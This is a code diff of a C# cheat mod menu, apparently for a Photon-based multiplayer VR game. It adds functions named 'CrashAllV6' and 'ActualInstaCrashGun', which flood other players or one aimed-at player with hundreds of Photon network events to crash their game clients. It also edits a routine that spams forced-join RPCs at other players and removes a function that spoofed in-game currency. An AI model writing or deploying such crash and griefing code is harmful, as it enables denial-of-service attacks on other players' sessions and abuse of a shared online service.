@@ -12,16 +12,6 @@ namespace JupiterX.Mods
 {
     public class Overpowered
     {
-        public static void BetaChangeShinyRock(int ammount)
-        {
-            CosmeticsWrapper.AddCurrency(ammount);
-        }
-
-        public static void SpazRocks()
-        {
-            BetaChangeShinyRock(UnityEngine.Random.RandomRangeInt(int.MinValue, int.MaxValue));
-        }
-
         public static void RigSpam()
         {
             Utility.MakeMeMaster();
@@ -175,12 +165,11 @@ namespace JupiterX.Mods
             foreach (Photon.Realtime.Player plr in PhotonNetwork.PlayerListOthers)
             {
                 GorillaComputer.instance.friendJoinCollider.playerIDsCurrentlyTouching.Add(plr.UserId);
-                GameObject.Find("Photon Manager").GetComponent<PhotonNetworkController>().friendIDList.Add(plr.UserId);
                 if (Main.lockTarget != null && GorillaComputer.instance.friendJoinCollider.playerIDsCurrentlyTouching.Contains(plr.UserId))
                 {
                     for (int i = 0; i < 25; i++)
                     {
-                        Utility.myVRRig().photonView.RPC("JoinPubWithFreinds", plr, null);
+                        GorillaGameManager.instance.photonView.RPC("JoinPubWithFreinds", plr, null);
                     }
                 }
             }
@@ -238,8 +227,7 @@ namespace JupiterX.Mods
                 if (Main.gunLocked && Main.lockTarget != null)
                 {
                     GorillaComputer.instance.friendJoinCollider.playerIDsCurrentlyTouching.Add(Main.lockTarget.photonView.Owner.UserId);
-                    GameObject.Find("Photon Manager").GetComponent<PhotonNetworkController>().friendIDList.Add(Main.lockTarget.photonView.Owner.UserId);
-                    PhotonView photonView = RigManager.GetPhotonViewFromVRRig(Main.lockTarget);
+                    PhotonView photonView = GorillaGameManager.instance.photonView;
                     if (Main.lockTarget != null && GorillaComputer.instance.friendJoinCollider.playerIDsCurrentlyTouching.Contains(Main.lockTarget.photonView.Owner.UserId))
                     {
                         for (int i = 0; i < 25; i++)
@@ -404,6 +392,22 @@ namespace JupiterX.Mods
             }
         }
 
+        public static void CrashAllV6()
+        {
+            if (Utility.RTrigger)
+            {
+                for (int i = 0; i < 700; i++)
+                {
+                    PhotonNetwork.RaiseEvent(2, null, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendUnreliable);
+                    PhotonNetwork.RaiseEvent(2, null, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendUnreliable);
+                }
+                for (int j = 0; j < 700; j++)
+                {
+                    PhotonNetwork.RaiseEvent(3, null, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendUnreliable);
+                    PhotonNetwork.RaiseEvent(3, null, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendUnreliable);
+                }
+            }
+        }
         public static void CrashAllV5()
         {
             if (Utility.RTrigger)
@@ -463,6 +467,32 @@ namespace JupiterX.Mods
                     for (int i = 0; i < 150; i++)
                     {
                         PhotonNetwork.RaiseEvent(2, null, new RaiseEventOptions { TargetActors = new int[] { plr.actorNumber } }, SendOptions.SendUnreliable);
+                        PhotonNetwork.RaiseEvent(3, null, new RaiseEventOptions { TargetActors = new int[] { plr.actorNumber } }, SendOptions.SendUnreliable);
+                    }
+                    PhotonNetwork.SendAllOutgoingCommands();
+                }
+            }
+        }
+
+        public static void ActualInstaCrashGun()
+        {
+            if (Main.GetGunInput(false))
+            {
+                var GunData = Main.RenderGun();
+                GameObject NewPointer = GunData.Pointer;
+                RaycastHit Ray = GunData.Ray;
+                Photon.Realtime.Player plr = Ray.collider.GetComponentInParent<PhotonView>().Owner;
+
+                if (Main.GetGunInput(true))
+                {
+                    for (int i = 0; i < 700; i++)
+                    {
+                        PhotonNetwork.RaiseEvent(2, null, new RaiseEventOptions { TargetActors = new int[] { plr.actorNumber } }, SendOptions.SendUnreliable);
+                        PhotonNetwork.RaiseEvent(2, null, new RaiseEventOptions { TargetActors = new int[] { plr.actorNumber } }, SendOptions.SendUnreliable);
+                    }
+                    for (int j = 0; j < 700; j++)
+                    {
+                        PhotonNetwork.RaiseEvent(3, null, new RaiseEventOptions { TargetActors = new int[] { plr.actorNumber } }, SendOptions.SendUnreliable);
                         PhotonNetwork.RaiseEvent(3, null, new RaiseEventOptions { TargetActors = new int[] { plr.actorNumber } }, SendOptions.SendUnreliable);
                     }
                     PhotonNetwork.SendAllOutgoingCommands();
